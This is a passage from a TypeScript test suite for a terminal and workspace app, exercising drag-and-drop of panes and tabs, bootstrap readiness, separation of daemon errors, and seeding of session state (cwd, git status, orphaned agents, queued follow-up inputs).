    // leaf ["z"]. Dragging the pane anchored at "a" must detach the
    // WHOLE leaf it belongs to -- both "a" and "b" together -- not just
    // "a" alone, since detachLeaf detaches the entire pane a session id
    // is found in.
    setState(
      [
        ws(
          "ws-1",
          [
            page("page-1", {
              type: "split",
              direction: "row",
              sizes: [0.5, 0.5],
              children: [leaf(["a", "b"]), leaf(["z"])],
            }),
            page("page-2", leaf(["c"])),
          ],
          "page-1"
        ),
      ],
      "ws-1",
      "a"
    );

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "a" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-2", mode: "right" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["z"]));
    expect(state.workspaces[0].pages[1].layout).toEqual({
      type: "split",
      direction: "row",
      sizes: [0.5, 0.5],
      children: [leaf(["c"]), leaf(["a", "b"])],
    });
  });

  it("removes the source page entirely when detaching its only pane", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))], "page-1")],
      "ws-1",
      "a"
    );

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "a" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-2", mode: "left" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages.map((p) => p.id)).toEqual(["page-2"]);
  });

  it("moves a single tab, merging it as a new tab via mode center", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a", "b"])), page("page-2", leaf(["c"]))], "page-1")],
      "ws-1",
      "a"
    );

    await movePaneOrTab(
      { kind: "tab", workspaceId: "ws-1", pageId: "page-1", sessionId: "b" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-2", mode: "center" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
    expect(state.workspaces[0].pages[1].layout).toEqual(leaf(["c", "b"], 1));
  });

  it("creates a new page when the drop target is a workspace, not a specific page", async () => {
    // Same reasoning as the previous test: page-1 needs two SEPARATE
    // panes for detaching one of them to leave the page non-empty and to
    // correctly carry both of the detached pane's tabs together.
    setState(
      [
        ws("ws-1", [
          page("page-1", {
            type: "split",
            direction: "row",
            sizes: [0.5, 0.5],
            children: [leaf(["a", "b"]), leaf(["z"])],
          }),
        ]),
        ws("ws-2", []),
      ],
      "ws-1",
      "a"
    );

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "a" },
      { kind: "workspace", workspaceId: "ws-2" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["z"]));
    expect(state.workspaces[1].pages).toHaveLength(1);
    expect(state.workspaces[1].pages[0].layout).toEqual(leaf(["a", "b"]));
  });

  it("is a no-op when the whole page's only pane is dropped back onto that same, now-empty page", async () => {
    // page-1's tree is a single leaf holding both "a" and "b" -- one
    // pane, two tabs -- so dragging that whole pane detaches the page's
    // entire tree, removing the page. There's no page left to graft back
    // into, so this resolves via the natural "target page not found"
    // fallback, not an explicit same-page guard (see movePaneOrTab's own
    // comment on why there isn't one).
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "a" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-1", mode: "right" }
    );

    expect(get(layoutState).workspaces[0].pages[0].layout).toEqual(leaf(["a", "b"]));
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  it("rearranges panes within the same page when the page has more than one pane", async () => {
    // page-1 has TWO panes (two separate leaves, "a" and "b"), unlike the
    // single-pane-two-tabs case above -- dragging pane "a" onto the same
    // page is a genuine rearrangement here (detach "a", the page still
    // has "b" left, graft "a" back in next to it), not a no-op.
    setState(
      [
        ws(
          "ws-1",
          [
            page("page-1", {
              type: "split",
              direction: "row",
              sizes: [0.5, 0.5],
              children: [leaf(["a"]), leaf(["b"])],
            }),
          ]
        ),
      ],
      "ws-1",
      "a"
    );

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "a" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-1", mode: "bottom" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "column",
      sizes: [0.5, 0.5],
      children: [leaf(["b"]), leaf(["a"])],
    });
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });

  it("merges into the specifically targeted pane when targetSessionId is given, not just the page's remembered focus", async () => {
    // page-1 has two panes: leaf(["a1","a2"]) and leaf(["b1"]). The
    // page's own remembered focusedSessionId is null (page()'s default),
    // so without the fix this would fall back to the tree's first
    // session ("a1") -- the fix under test is that explicitly targeting
    // "b1" lands the merge there instead.
    setState(
      [
        ws("ws-1", [
          page("page-1", {
            type: "split",
            direction: "row",
            sizes: [0.5, 0.5],
            children: [leaf(["a1", "a2"]), leaf(["b1"])],
          }),
        ]),
      ],
      "ws-1",
      "a1"
    );

    await movePaneOrTab(
      { kind: "tab", workspaceId: "ws-1", pageId: "page-1", sessionId: "a2" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-1", mode: "center", targetSessionId: "b1" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "row",
      sizes: [0.5, 0.5],
      children: [leaf(["a1"]), leaf(["b1", "a2"], 1)],
    });
  });

  it("lands a tab dropped on another pane's tab BAR at the caret's index, not at the end", async () => {
    // The gesture the bar exists for: "a2" is dragged out of the left
    // pane and dropped between "b1" and "b2" in the right one. A center
    // merge appends, so without targetIndex it would arrive after "b2"
    // -- somewhere the insertion caret never pointed.
    setState(
      [
        ws("ws-1", [
          page("page-1", {
            type: "split",
            direction: "row",
            sizes: [0.5, 0.5],
            children: [leaf(["a1", "a2"]), leaf(["b1", "b2"])],
          }),
        ]),
      ],
      "ws-1",
      "a1"
    );

    await movePaneOrTab(
      { kind: "tab", workspaceId: "ws-1", pageId: "page-1", sessionId: "a2" },
      {
        kind: "page",
        workspaceId: "ws-1",
        pageId: "page-1",
        mode: "center",
        targetSessionId: "b1",
        targetIndex: 1,
      }
    );

    expect(get(layoutState).workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "row",
      sizes: [0.5, 0.5],
      children: [leaf(["a1"]), leaf(["b1", "a2", "b2"], 1)],
    });
  });

  it("still appends when no index is named, which is every drop that has no caret", async () => {
    setState(
      [
        ws("ws-1", [
          page("page-1", {
            type: "split",
            direction: "row",
            sizes: [0.5, 0.5],
            children: [leaf(["a1", "a2"]), leaf(["b1", "b2"])],
          }),
        ]),
      ],
      "ws-1",
      "a1"
    );

    await movePaneOrTab(
      { kind: "tab", workspaceId: "ws-1", pageId: "page-1", sessionId: "a2" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-1", mode: "center", targetSessionId: "b1" }
    );

    expect(get(layoutState).workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "row",
      sizes: [0.5, 0.5],
      children: [leaf(["a1"]), leaf(["b1", "b2", "a2"], 2)],
    });
  });

  it("grafts at the specific pane via targetSessionId on a 3+-pane page, not the whole page", async () => {
    // A 2x2 grid: dragging pane "c" onto pane "d"'s right edge should
    // split just d's location, not wrap the entire grid.
    setState(
      [
        ws("ws-1", [
          page("page-1", {
            type: "split",
            direction: "column",
            sizes: [0.5, 0.5],
            children: [
              { type: "split", direction: "row", sizes: [0.5, 0.5], children: [leaf(["a"]), leaf(["b"])] },
              { type: "split", direction: "row", sizes: [0.5, 0.5], children: [leaf(["c"]), leaf(["d"])] },
            ],
          }),
        ]),
      ],
      "ws-1",
      "c"
    );

    await movePaneOrTab(
      { kind: "pane", workspaceId: "ws-1", pageId: "page-1", sessionId: "c" },
      { kind: "page", workspaceId: "ws-1", pageId: "page-1", mode: "right", targetSessionId: "d" }
    );

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "column",
      sizes: [0.5, 0.5],
      children: [
        { type: "split", direction: "row", sizes: [0.5, 0.5], children: [leaf(["a"]), leaf(["b"])] },
        { type: "split", direction: "row", sizes: [0.5, 0.5], children: [leaf(["d"]), leaf(["c"])] },
      ],
    });
  });
});

describe("reorderTabWithinPane", () => {
  it("reorders a tab within the active page's pane and persists", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b", "c"], 0))])], "ws-1", "a");

    await reorderTabWithinPane("a", 2);

    expect(get(layoutState).workspaces[0].pages[0].layout).toEqual(leaf(["b", "c", "a"], 2));
  });
});

describe("reorderWorkspaceAction", () => {
  it("reorders workspaces and persists", async () => {
    setState([ws("ws-1", []), ws("ws-2", []), ws("ws-3", [])], "ws-1", null);

    await reorderWorkspaceAction("ws-3", 0);

    expect(get(layoutState).workspaces.map((w) => w.id)).toEqual(["ws-3", "ws-1", "ws-2"]);
  });
});

describe("movePageAction", () => {
  it("moves a non-active page without changing activeWorkspaceId", async () => {
    setState(
      [
        ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))], "page-1"),
        ws("ws-2", []),
      ],
      "ws-1",
      "a"
    );

    await movePageAction("page-2", "ws-2", 0);

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-1");
    expect(state.workspaces[1].pages.map((p) => p.id)).toEqual(["page-2"]);
  });

  it("follows the moved page when it was the active one", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"]))], "page-1"), ws("ws-2", [])],
      "ws-1",
      "a"
    );

    await movePageAction("page-1", "ws-2", 0);

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.workspaces[1].activePageId).toBe("page-1");
    expect(state.focusedSessionId).toBe("a");
  });
});

describe("bootstrap / pollForStartupState readiness", () => {
  afterEach(() => {
    teardown();
  });

  it("treats an empty WorkspacesData as ready on the first poll attempt, not still-connecting", async () => {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});

    await bootstrap();
    // bootstrap() resolves once listeners are registered; give the
    // fire-and-forget pollForStartupState's first iteration a tick to run.
    await new Promise((resolve) => setTimeout(resolve, 0));

    const state = get(layoutState);
    expect(state.status).toBe("ready");
    expect(state.workspaces).toEqual([]);
  });

  it("keeps polling (stays connecting) while the invoke rejects, then becomes ready once it resolves", async () => {
    vi.mocked(backend.getWorkspacesState)
      .mockRejectedValueOnce(new Error("not managed yet"))
      .mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});

    await bootstrap();
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(get(layoutState).status).toBe("connecting");

    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(get(layoutState).status).toBe("ready");
  });

  // The tab maps decide which layout-tree ids are boards/files and which
  // are daemon sessions. Reaching "ready" without them means the first
  // render of a restored board or file tab is a <TerminalPane> for an id
  // the daemon never had -- blank, and its resize takes the daemon's
  // "unknown session" to the whole window as a connection error.
  it("does not become ready until the tab maps are in the store", async () => {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockImplementation(
      () => new Promise((resolve) => setTimeout(() => resolve({ "ft-1": "/ws/readme.md" }), 20))
    );
    vi.mocked(backend.getBoardTabs).mockImplementation(
      () =>
        new Promise((resolve) =>
          setTimeout(() => resolve({ "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" } }), 20)
        )
    );

    const readyStates: LayoutState[] = [];
    const stop = layoutState.subscribe((s) => {
      if (s.status === "ready") readyStates.push(s);
    });
    await bootstrap();
    await vi.waitFor(() => expect(get(layoutState).status).toBe("ready"));
    stop();

    expect(readyStates.length).toBeGreaterThan(0);
    expect(readyStates[0].boardTabsById["bt-1"]).toEqual({ workspaceId: "ws-1", contextFolder: "/ws/auth" });
    expect(readyStates[0].fileTabsById["ft-1"]).toEqual({ path: "/ws/readme.md" });
  });

  // FileTabs/BoardTabs are managed at the very end of session::bootstrap,
  // so an invoke that lands first rejects with "state not managed" --
  // exactly what getWorkspacesState is already retried for. Swallowing it
  // once left the maps empty for the whole run.
  it("retries the tab maps when the invoke rejects because Rust isn't managed yet", async () => {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs)
      .mockRejectedValueOnce(new Error("state not managed"))
      .mockResolvedValue({ "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" } });

    await bootstrap();

    await vi.waitFor(
      () => expect(get(layoutState).boardTabsById["bt-1"]).toBeDefined(),
      { timeout: 3000 }
    );
    expect(get(layoutState).status).toBe("ready");
  });
});

// The streaming connection carries Attach/WriteInput/ResizeSession, so a
// Response::Error on it means the daemon refused ONE of those -- usually
// for a session that has just exited. Reporting that as a lost connection
// is what let a stray resize replace the whole window with "Couldn't
// connect to the daemon"; the two now travel on separate events.
describe("daemon errors: refused request vs lost connection", () => {
  afterEach(() => {
    teardown();
    vi.mocked(listen).mockResolvedValue(() => {});
  });

  /// Bootstraps with `listen` capturing every handler it registers, so a
  /// test can fire a Tauri event by name the way the Rust side would.
  async function bootstrapCapturingListeners(): Promise<Map<string, (e: { payload: unknown }) => void>> {
    const handlers = new Map<string, (e: { payload: unknown }) => void>();
    vi.mocked(listen).mockImplementation(async (event: string, handler: unknown) => {
      handlers.set(event, handler as (e: { payload: unknown }) => void);
      return () => {};
    });
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});
    await bootstrap();
    await vi.waitFor(() => expect(get(layoutState).status).toBe("ready"));
    return handlers;
  }

  it("a refused request banners, leaving the app up", async () => {
    const handlers = await bootstrapCapturingListeners();

    handlers.get("daemon-request-error")!({ payload: "unknown session: abc" });

    expect(get(daemonRequestError)).toBe("unknown session: abc");
    expect(get(layoutState).status).toBe("ready");
    expect(get(layoutState).errorMessage).toBe("");
  });

  it("a lost connection still takes the whole window", async () => {
    const handlers = await bootstrapCapturingListeners();

    handlers.get("daemon-error")!({ payload: "daemon closed the connection" });

    expect(get(layoutState).status).toBe("error");
    expect(get(layoutState).errorMessage).toBe("daemon closed the connection");
    expect(get(daemonRequestError)).toBeNull();
  });
});

// cwd/status/restored reach the frontend only as pushes, and their
// baseline only in reply to Attach -- which runs once per app PROCESS. A
// reloaded frontend therefore has to ask for them, or every terminal tab
// loses its cwd-derived label, its status dot, and its "open this
// context's board" button until the shell's next prompt.
describe("bootstrap seeds the push-fed session maps", () => {
  afterEach(() => {
    teardown();
  });

  async function bootstrapReady(): Promise<void> {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});
    await bootstrap();
    await vi.waitFor(() => expect(get(layoutState).status).toBe("ready"));
  }

  it("fills cwd, status and the restored badge from the daemon", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws/auth", status: "working", restored: true, interrupted: false, orphan: null, failureReason: null },
      { id: "s-2", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).cwdBySessionId["s-1"]).toBe("/ws/auth"));
    const state = get(layoutState);
    expect(state.cwdBySessionId["s-2"]).toBe("/ws");
    expect(state.sessionStatusById["s-1"]).toBe("working");
    expect(state.restoredSessionIds.has("s-1")).toBe(true);
    expect(state.restoredSessionIds.has("s-2")).toBe(false);
    // A session that already existed when we attached: its idle is not
    // a launch-time prompt. The rail scheduler needs this so a reload
    // still completes an agent-prompt step whose turn had ended.
    expect(state.sessionsSeenWorking.has("s-1")).toBe(true);
    expect(state.sessionsSeenWorking.has("s-2")).toBe(true);
    // Straight into the map, never through handleSessionStatusChanged:
    // re-reading a status the human has already seen is not a transition.
    expect(notifications.maybeNotifyStatusChange).not.toHaveBeenCalled();
  });

  // A status the app found already in place has no start time -- the
  // daemon reports the change, never the moment. So it is stamped when
  // gavin met it and marked unwatched, and the hub's inbox reads the
  // duration built from it as a floor rather than a measurement.
  it("stamps a baselined status as one it did not watch begin", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws", status: "waiting_for_input", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).statusSinceById["s-1"]).toBeDefined());
    expect(get(layoutState).statusSinceById["s-1"].watched).toBe(false);
  });

  // A push that has landed is newer than the snapshot, and its stamp is
  // the one that was actually watched -- overwriting it would throw away
  // the better answer for the worse one.
  it("never overwrites a stamp a live transition already set", async () => {
    handleSessionStatusChanged("s-1", "waiting_for_input");
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).cwdBySessionId["s-1"]).toBe("/ws"));
    expect(get(layoutState).statusSinceById["s-1"].watched).toBe(true);
  });
  it("fills the interrupted set, which the restored one does not speak for", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-agent", cwd: "/ws", status: "idle", restored: true, interrupted: true, orphan: null, failureReason: null },
      { id: "s-shell", cwd: "/ws", status: "idle", restored: true, interrupted: false, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).interruptedSessionIds.has("s-agent")).toBe(true));
    const state = get(layoutState);
    // Both were restored; only one of them lost a run.
    expect(state.restoredSessionIds).toEqual(new Set(["s-agent", "s-shell"]));
    expect(state.interruptedSessionIds.has("s-shell")).toBe(false);
  });

  it("fills the orphan map, so a reload cannot hide a live agent", async () => {
    // The push that carries this is baselined on Attach, which happens
    // once per app PROCESS -- so without the read-back a frontend reload
    // comes up showing an ordinary interrupted tab over an agent that is
    // still editing the checkout. Under `tauri dev` that is every edit.
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      {
        id: "s-orphan",
        cwd: "/ws",
        status: "idle",
        restored: true,
        interrupted: true,
        orphan: { pid: 4172, command: "claude" },
        failureReason: null,
      },
      { id: "s-agent", cwd: "/ws", status: "idle", restored: true, interrupted: true, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() =>
      expect(get(layoutState).orphanBySessionId["s-orphan"]).toEqual({ pid: 4172, command: "claude" })
    );
    // Both lost their run; only one of them left something running.
    const state = get(layoutState);
    expect(state.interruptedSessionIds).toEqual(new Set(["s-orphan", "s-agent"]));
    expect(state.orphanBySessionId["s-agent"]).toBeUndefined();
  });

  it("never lets a silent baseline delete an orphan a push already landed", async () => {
    // Positive-only, like restored and interrupted. A daemon too old to
    // probe reports `orphan: null, failureReason: null` for everything, and treating that as
    // "nothing survived" would erase a warning the app had already been
    // given -- the exact absent-vs-unknown confusion this feature is
    // about.
    vi.mocked(backend.getSessionBaselines).mockImplementation(async () => {
      handleSessionOrphaned("s-1", { pid: 4172, command: "claude" });
      return [{ id: "s-1", cwd: "/ws", status: "idle", restored: true, interrupted: true, orphan: null, failureReason: null }];
    });

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).restoredSessionIds.has("s-1")).toBe(true));
    expect(get(layoutState).orphanBySessionId["s-1"]).toEqual({ pid: 4172, command: "claude" });
  });


  // The reason is a push like the other four, and its baseline rides on
  // Attach -- which happens once per app PROCESS. Without this a
  // reloaded frontend comes up with a red session and nothing to say for
  // itself, which is the exact state this feature exists to replace.
  it("fills the failure reason, so a reload does not leave a red session mute", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-broke", cwd: "/ws", status: "failed", restored: false, interrupted: false, orphan: null, failureReason: "API Error: x" },
      { id: "s-fine", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).failureReasonById["s-broke"]).toBe("API Error: x"));
    const state = get(layoutState);
    expect(state.sessionStatusById["s-broke"]).toBe("failed");
    expect(state.failureReasonById["s-fine"]).toBeUndefined();
    // Read straight into the map, never through handleSessionFailed:
    // re-reading a failure the human has already seen is not a new one.
    expect(notifications.maybeNotifyStatusChange).not.toHaveBeenCalled();
  });

  it("never overwrites a push that already landed", async () => {
    vi.mocked(backend.getSessionBaselines).mockImplementation(async () => {
      // A live push beats the snapshot this call is about to return.
      handleCwdChanged("s-1", "/ws/live");
      return [{ id: "s-1", cwd: "/ws/stale", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null }];
    });

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).cwdBySessionId["s-1"]).toBe("/ws/live"));
  });

  it("survives the daemon refusing the query", async () => {
    vi.mocked(backend.getSessionBaselines).mockRejectedValue(new Error("state not managed"));

    await bootstrapReady();

    expect(get(layoutState).status).toBe("ready");
    expect(get(layoutState).cwdBySessionId).toEqual({});
  });

  // The fourth push-fed map, and the one the sidebar's repo chip, the
  // page rows' branch lines and the pane's git dot all read. Its baseline
  // is the same once-per-app-PROCESS Attach, so without this seed every
  // frontend load after the first shows no git anywhere -- and the
  // daemon cannot fix it by itself, because GitStatusChanged only fires
  // when the status actually CHANGES.
  it("fills the git status the sidebar's repo chip reads", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws/auth", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
      { id: "s-2", cwd: "/elsewhere", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);
    vi.mocked(backend.getGitBaselines).mockResolvedValue([
      { repoRoot: "/ws", branch: "main", dirty: true, ahead: 2, behind: 0, hasUpstream: true },
      null,
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).gitStatusById["s-1"]).not.toBeUndefined());
    const state = get(layoutState);
    expect(state.gitStatusById["s-1"]).toEqual({
      repoRoot: "/ws",
      branch: "main",
      dirty: true,
      ahead: 2,
      behind: 0,
      hasUpstream: true,
    });
    // Asked about the very cwds the session baselines reported, in order.
    expect(backend.getGitBaselines).toHaveBeenCalledWith(["/ws/auth", "/elsewhere"]);
    // A session outside any repo is recorded as null, not left absent:
    // "checked, no repo" is a real answer and must not be re-asked.
    expect(state.gitStatusById["s-2"]).toBeNull();
  });

  it("never overwrites a git push that already landed", async () => {
    const live = { repoRoot: "/ws", branch: "live", dirty: false, ahead: 0, behind: 0, hasUpstream: false };
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);
    vi.mocked(backend.getGitBaselines).mockImplementation(async () => {
      handleGitStatusChanged("s-1", live);
      return [{ repoRoot: "/ws", branch: "stale", dirty: true, ahead: 9, behind: 9, hasUpstream: true }];
    });

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).gitStatusById["s-1"]).toEqual(live));
  });

  // Not fatal, and never blocks the cwd/status seed it rides along with:
  // git can be missing, slow, or refuse a repo outright.
  it("keeps the cwd seed when the git half fails", async () => {
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-1", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);
    vi.mocked(backend.getGitBaselines).mockRejectedValue(new Error("git was not found on PATH"));

    await bootstrapReady();

    await vi.waitFor(() => expect(get(layoutState).cwdBySessionId["s-1"]).toBe("/ws"));
    expect(get(layoutState).gitStatusById).toEqual({});
  });

  // The fifth push-fed map, and the one where a missed baseline is worst:
  // `QueuedInputsChanged` is routed to a session's attached writer, and
  // Attach runs once per app PROCESS, so a frontend reload would show an
  // empty strip over a follow-up the daemon is still holding -- which
  // reads as "delivered" to the human who queued it and walked away.
  it("fills every session's queue from the read-back", async () => {
    vi.mocked(backend.listQueuedInputs).mockResolvedValue([
      { id: "q1", sessionId: "s-1", text: "run the tests", createdAtUs: 1_000 },
      { id: "q2", sessionId: "s-2", text: "then commit", createdAtUs: 2_000 },
      { id: "q3", sessionId: "s-1", text: "and push", createdAtUs: 3_000 },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(queuedInputsById)["s-1"]).not.toBeUndefined());
    // Grouped by session, in the daemon's order -- which is delivery
    // order, not the order the rows were written.
    expect(get(queuedInputsById)["s-1"].map((q) => q.id)).toEqual(["q1", "q3"]);
    expect(get(queuedInputsById)["s-2"].map((q) => q.id)).toEqual(["q2"]);
  });

  it("survives a daemon too old to answer the read-back", async () => {
    // The ordinary path against a pre-v29 daemon: the request never
    // reaches the wire, and the app behaves as it did before the feature
    // existed rather than showing an error nobody can act on here.
    vi.mocked(backend.listQueuedInputs).mockRejectedValue(new Error("unsupported request"));

    await bootstrapReady();

    expect(get(layoutState).status).toBe("ready");
    expect(get(queuedInputsById)).toEqual({});
  });

  it("replaces the whole map rather than filling gaps", async () => {
    // The opposite rule from the baselines above, on purpose. Those
    // pushes each state one fact about one moment, so a landed push
    // outranks a snapshot. This reply is the daemon's WHOLE list as it
    // stands, so a merge would keep a queue that has since drained --
    // and a delivered follow-up shown as pending invites a second send.
    handleQueuedInputsChanged("s-old", [
      { id: "stale", sessionId: "s-old", text: "gone", createdAtUs: 1 },
    ]);
    vi.mocked(backend.listQueuedInputs).mockResolvedValue([
      { id: "q1", sessionId: "s-1", text: "run the tests", createdAtUs: 1_000 },
    ]);

    await bootstrapReady();

    await vi.waitFor(() => expect(get(queuedInputsById)["s-1"]).not.toBeUndefined());
    expect(get(queuedInputsById)["s-old"]).toBeUndefined();
  });
});

describe("the follow-up queue map", () => {
  it("takes the push as the whole truth for that session", () => {
    handleQueuedInputsChanged("s-1", [
      { id: "a", sessionId: "s-1", text: "first", createdAtUs: 1 },
      { id: "b", sessionId: "s-1", text: "second", createdAtUs: 2 },
    ]);
    // A reorder arrives as the full list, so this replaces rather than
    // merges: a client that missed a push still converges on the last.
    handleQueuedInputsChanged("s-1", [
      { id: "b", sessionId: "s-1", text: "second", createdAtUs: 2 },
    ]);

    expect(get(queuedInputsById)["s-1"].map((q) => q.id)).toEqual(["b"]);
  });

  it("drops the key when a queue empties, rather than storing []", () => {
    handleQueuedInputsChanged("s-1", [
      { id: "a", sessionId: "s-1", text: "first", createdAtUs: 1 },
    ]);
    handleQueuedInputsChanged("s-1", []);

    // "Has something pending" is one test, not two: no surface should
    // have to tell an empty array from a missing key.
    expect("s-1" in get(queuedInputsById)).toBe(false);
  });

  it("clears a queue when its session exits", () => {
    // Unlike cwd and status, which stay true after a session ends, an
    // undelivered follow-up on a dead session can never be delivered --
    // and the daemon drops it with the session for the same reason.
    setState([ws("w1", [page("p1", { type: "leaf", tabs: ["s-1"], activeTabIndex: 0 })])], "w1", "s-1");
    handleQueuedInputsChanged("s-1", [
      { id: "a", sessionId: "s-1", text: "first", createdAtUs: 1 },
    ]);

    handleSessionExited("s-1");

    expect("s-1" in get(queuedInputsById)).toBe(false);
  });
});

/// Puts an [agent] block on a workspace's root context, the way a
/// watcher push would. resolvedAgentFor reads gavinTrees directly, so
/// this is how a test controls the resolved command/file.
/// One row of the profile table, carrying the only field a launch
/// reads off it here: the text this agent prints when it has broken.
function agentProfile(id: string, failurePatterns: string[]) {
  return {
    id,
    label: id,
    instructionsFile: "CLAUDE.md",
    command: "claude",
    mcpSupported: true,
    mcpConfigFile: ".mcp.json",
    promptArgs: "",
    headlessArgs: "",
    modelFlag: "",
    models: [],
    failurePatterns,
    failureCauses: [],
    sessionIdArgs: "",
    sessionIdDiscovery: "",
    resumeArgs: "",
    usageProbe: null,
  };
}

/// Seeds the root context's `[agent]` block, and — unless a test says
/// otherwise — records that the human approved it.
///
/// Approved by default because that is what every case here is about:
/// which command a workspace resolves to, not whether it is allowed to.
/// Left unapproved, `command` and `file` are inert (`workspaceTrust.ts`)
/// and the assertions would be reading the gate rather than the
/// resolution. The gate has its own describe block below.
function seedAgentConfig(
  workspaceId: string,
  agent: { profile: string | null; file: string | null; command: string | null },
  approved = true
): void {
  gavinTrees.update((t) => ({
    ...t,
    [workspaceId]: {
      rootPath: "/tmp/ws",
      rootMissing: false,
      contexts: [
        {
          folderPath: "/tmp/ws",
          kind: "root",
          name: "ws",
          plans: [],
          docs: [],
          specs: [],
          hasPrd: false,
          configWarning: false,
          agent,
        },
      ],
    },
  }));
  const hash = executionKeysHash(executionKeys(agent, get(worktreeSetups)[workspaceId] ?? []));
  layoutState.update((st) => ({
    ...st,
    workspaces: st.workspaces.map((w) =>
